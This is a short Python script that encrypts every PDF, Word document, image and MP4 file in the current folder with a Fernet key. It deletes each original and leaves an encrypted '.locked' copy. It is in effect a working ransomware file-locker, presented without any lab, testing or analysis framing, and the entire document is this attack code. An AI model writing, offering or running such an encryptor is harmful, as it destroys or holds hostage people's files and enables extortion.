# import required module
from cryptography.fernet import Fernet
from glob import glob
import os

#setting
format_file = ['.pdf', '.doc', '.docx', '.png', 'jpg', '.jpeg', '.mp4']

all_file = []
for i in range(len(format_file)):
    fragmet_all_file = glob('./*'+format_file[i])
    for j in range(len(fragmet_all_file)):
        all_file.append(fragmet_all_file[j])

print(all_file)


# opening the key
with open('filekey.key', 'rb') as filekey:
    key = filekey.read()
  
# using the generated key
fernet = Fernet(key)

for i in range(len(all_file)):
    with open(all_file[i], 'rb') as file:
        original = file.read()
    encrypted = fernet.encrypt(original)
    #remove original
    os.remove(all_file[i])
    #write the encrypted version
    with open(all_file[i]+'.locked', 'wb') as encrypted_file:
        encrypted_file.write(encrypted)